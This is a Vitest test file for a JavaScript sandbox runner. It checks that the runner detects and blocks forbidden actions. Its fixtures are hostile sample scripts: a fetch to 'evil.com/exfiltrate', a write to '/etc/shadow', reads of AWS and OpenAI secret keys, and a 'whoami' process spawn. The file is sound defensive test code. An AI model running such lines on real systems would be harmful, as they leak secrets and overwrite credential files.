import { describe, it, expect } from 'vitest'
import { executeInSandbox } from '@/lib/sandbox'

describe('Runtime Sandbox Isolation Runner', () => {
  it('executes safe arithmetic or text scripts successfully with 0 violations', async () => {
    const script = `
      const x = 42;
      const y = 58;
      const sum = x + y;
      console.log('Result:', sum);
    `
    const result = await executeInSandbox(script)

    expect(result.success).toBe(true)
    expect(result.exitCode).toBe(0)
    expect(result.timedOut).toBe(false)
    expect(result.memoryExceeded).toBe(false)
    expect(result.stdout).toContain('Result: 100')
    expect(result.violations).toHaveLength(0)
    expect(result.attemptedActions.networkCalls).toHaveLength(0)
    expect(result.attemptedActions.filesystemWrites).toHaveLength(0)
    expect(result.attemptedActions.processSpawns).toHaveLength(0)
    expect(result.attemptedActions.envAccesses).toHaveLength(0)
  })

  it('detects and blocks unauthorized fetch call, recording network call and emitting violation', async () => {
    const script = `
      fetch('https://evil.com/exfiltrate');
    `
    const result = await executeInSandbox(script, { allowNetwork: false })

    expect(result.success).toBe(false)
    expect(result.attemptedActions.networkCalls).toContain('https://evil.com/exfiltrate')

    const networkViolation = result.violations.find((v) => v.type === 'network')
    expect(networkViolation).toBeDefined()
    expect(networkViolation?.severity).toBe('high')
    expect(networkViolation?.description).toContain('https://evil.com/exfiltrate')
  })

  it('detects and blocks unauthorized fs.writeFileSync call, recording write and emitting violation', async () => {
    const script = `
      const fs = require('fs');
      fs.writeFileSync('/etc/shadow', 'malicious content');
    `
    const result = await executeInSandbox(script)

    expect(result.success).toBe(false)
    expect(result.attemptedActions.filesystemWrites).toContain('/etc/shadow')

    const fsViolation = result.violations.find((v) => v.type === 'filesystem')
    expect(fsViolation).toBeDefined()
    expect(fsViolation?.severity).toBe('high')
    expect(fsViolation?.description).toContain('/etc/shadow')
  })

  it('terminates on execution timeout for infinite loops (while(true){})', async () => {
    const script = `
      while (true) {}
    `
    const result = await executeInSandbox(script, { timeoutMs: 150 })

    expect(result.success).toBe(false)
    expect(result.timedOut).toBe(true)

    const timeoutViolation = result.violations.find((v) => v.type === 'timeout')
    expect(timeoutViolation).toBeDefined()
    expect(timeoutViolation?.severity).toBe('critical')
  })

  it('detects sensitive environment variable access and emits violation', async () => {
    const script = `
      const secretKey = process.env.AWS_SECRET_ACCESS_KEY;
      const apiKey = process.env.OPENAI_API_KEY;
      const normalConfig = process.env.APP_NAME;
    `
    const result = await executeInSandbox(script)

    expect(result.attemptedActions.envAccesses).toContain('AWS_SECRET_ACCESS_KEY')
    expect(result.attemptedActions.envAccesses).toContain('OPENAI_API_KEY')
    expect(result.attemptedActions.envAccesses).toContain('APP_NAME')

    const envViolations = result.violations.filter((v) => v.type === 'env')
    expect(envViolations.length).toBeGreaterThanOrEqual(2)
    expect(envViolations.some((v) => v.description.includes('AWS_SECRET_ACCESS_KEY'))).toBe(true)
    expect(envViolations.some((v) => v.description.includes('OPENAI_API_KEY'))).toBe(true)
    // Non-sensitive APP_NAME should not generate an env violation
    expect(envViolations.some((v) => v.description.includes('APP_NAME'))).toBe(false)
  })

  it('detects and blocks process spawns via child_process', async () => {
    const script = `
      const cp = require('child_process');
      cp.exec('whoami');
    `
    const result = await executeInSandbox(script)

    expect(result.success).toBe(false)
    expect(result.attemptedActions.processSpawns).toContain('whoami')

    const procViolation = result.violations.find((v) => v.type === 'process')
    expect(procViolation).toBeDefined()
    expect(procViolation?.severity).toBe('critical')
  })

  it('allows network calls when allowNetwork option is true', async () => {
    const script = `
      await fetch('https://api.example.com/status');
    `
    const result = await executeInSandbox(script, { allowNetwork: true })

    expect(result.attemptedActions.networkCalls).toContain('https://api.example.com/status')
    expect(result.violations.filter((v) => v.type === 'network')).toHaveLength(0)
    expect(result.success).toBe(true)
  })

  it('allows filesystem writes within allowedPaths', async () => {
    const script = `
      fs.writeFileSync('/tmp/sandbox/test.txt', 'hello');
    `
    const result = await executeInSandbox(script, {
      allowedPaths: ['/tmp/sandbox'],
    })

    expect(result.attemptedActions.filesystemWrites).toContain('/tmp/sandbox/test.txt')
    expect(result.violations.filter((v) => v.type === 'filesystem')).toHaveLength(0)
    expect(result.success).toBe(true)
  })
})
